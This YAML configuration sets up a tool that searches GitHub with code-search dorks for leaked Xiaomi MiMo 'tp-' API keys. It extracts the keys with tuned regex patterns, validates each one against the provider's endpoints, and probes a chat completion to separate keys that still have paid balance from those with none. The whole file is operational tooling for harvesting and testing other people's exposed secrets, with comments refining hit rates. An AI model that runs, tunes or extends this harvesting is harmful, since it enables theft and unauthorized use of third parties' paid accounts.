# Xiaomi MiMo — mainland China Token Plan scan configuration (task: mimo-cn)
# Endpoint: https://token-plan-cn.xiaomimimo.com/v1   (mainland China cluster)
# NOTE: the Singapore cluster is a SEPARATE config now:
#   mimo-sg -> examples/config-mimo-sg.yaml            (token-plan-sgp.xiaomimimo.com)
# IMPORTANT: Token Plan endpoints only accept tp- prefixed keys. The pay-as-you-go
# sk- keys (api.xiaomimimo.com) cannot be validated on these endpoints, so only
# tp- keys are collected.
# Upstream: per-endpoint GitHub search conditions (top 1000 results per query).
# Downstream: validates keys against this endpoint's GET /models, then probes a
# minimal chat completion to surface 402 (zero-balance keys are filtered to
# no-quota-keys.txt instead of being marked valid).
# Results are written to ./data-mimo/providers/mimo-cn/*.txt

global:
  workspace: "./data-mimo"
  max_retries_requeued: 3
  proxy: ""
  github_credentials:
    sessions:
      - "your_github_session_here"
    tokens:
      - "your_github_token_here"
    strategy: "round_robin"
  user_agents:
    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

pipeline:
  threads:
    search: 1
    gather: 4
    check: 2
    inspect: 1
  queue_sizes:
    search: 100000
    gather: 200000
    check: 500000
    inspect: 1000000

monitoring:
  update_interval: 2.0
  error_threshold: 0.1
  queue_threshold: 1000000
  memory_threshold: 1073741824
  response_threshold: 5.0

persistence:
  batch_size: 50  # flush every 50 items (or save_interval seconds); 1 = a write+log per item
  save_interval: 5
  queue_interval: 60
  snapshot_interval: 300
  auto_restore: false  # clean start (replay ratchets the corpus)
  shutdown_timeout: 30
  format: txt

ratelimits:
  github_api:
    base_rate: 0.15
    burst_limit: 3
    adaptive: true
  mimo-cn:
    base_rate: 0.2
    burst_limit: 2
    adaptive: true
  mimo-sg:
    base_rate: 0.2
    burst_limit: 2
    adaptive: true

tasks:
  - name: mimo-cn
    enabled: true
    provider_type: mimo
    use_api: true
    max_pages: 1000
    search_types: [code]
    stages:
      search: true
      gather: true
      check: true
      inspect: true
    api:
      base_url: https://token-plan-cn.xiaomimimo.com/v1
      completion_path: /chat/completions
      model_path: /models
      default_model: mimo-v2.5-pro
      auth_key: Authorization
      extra_headers: {}
      api_version: ""
      timeout: 30
      retries: 3
      use_proxy: false  # domestic endpoint — connect directly
    patterns:
      # Real mimo Token Plan format MEASURED `tp-` + 48 alnum (n=1 authentic,
      # prod 2026-09-22). The former naked tp- pattern measured 142 invalid/run
      # — `tp-secret-` / `tp-your-` style hyphenated placeholders — against
      # that 1 authentic key. The task-level pattern only fires on
      # MIMO_*/XIAOMIMIMO_* env-name assignments, and the alnum-only body
      # drops the hyphenated placeholders at extraction time. Host-named
      # conditions override with a Bearer/quoted variadic below. The captured
      # family stays `tp-` ONLY — never widen it to sk-: the pay-as-you-go
      # surface is unmeasured and an sk- branch would re-flood the check stage
      # with other vendors. No upper bound on the body: a fixed width silently
      # drops keys if the provider rotates the format (serpapi lesson) —
      # `tp-` + 48 is documented, not enforced.
      # KNOWN COVERAGE GAP (TRIPWIRE): mimo pay-as-you-go `sk-` keys on
      # api.xiaomimimo.com are scanned by NO config — the Token Plan endpoints
      # here cannot validate them and no measured corpus exists. Do NOT invent
      # a pattern/config for them from docs; if they ever need collecting,
      # measure the real corpus first, then add a dedicated config.
      key_pattern: >-
        (?i)(?:mimo[_-]?(?:api[_-]?)?key|XIAOMIMIMO[_-]?API[_-]?KEY|MIMO_API_KEY|MIMO_TOKEN)[\"'\]]{0,2}\s*[:=]\s*[\"']?(tp-[A-Za-z0-9]{16,})[\"']?
      address_pattern: ""
      endpoint_pattern: ""
      model_pattern: ""
    conditions:
      # Each GitHub API search query has its own 1000-result window.
      # Env-name dorks inherit the narrow task pattern above.
      - query: '"MIMO_API_KEY"'
      - query: '"MIMO_API_KEY="'
      - query: '"MIMO_API_KEY:"'
      # Domain-anchored blobs: allow Bearer/quoted tp- keys without the env
      # name (tp- only — an sk- variadic would re-flood the check stage).
      - query: '"token-plan-cn.xiaomimimo.com"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"xiaomimimo.com"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"xiaomimimo.com" "Authorization"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"xiaomimimo.com" "api_key"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"mimo" "api_key" "xiaomi"'
      - query: '"tp-" "xiaomimimo.com"'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"mimo-v2.5"'
      - query: '"MIMO_API_KEY" language:Python'
      - query: '"xiaomimimo.com" language:JavaScript'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"xiaomimimo.com" extension:env'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"xiaomimimo.com" extension:json'
        patterns:
          key_pattern: >-
            (?i)(?:Bearer\s+|[\"']\s*)?(tp-[A-Za-z0-9]{16,})
      - query: '"mimo" extension:yaml'
    rate_limit:
      base_rate: 0.2
      burst_limit: 2
      adaptive: true
    storage:
      directory: ""
      plan: ""
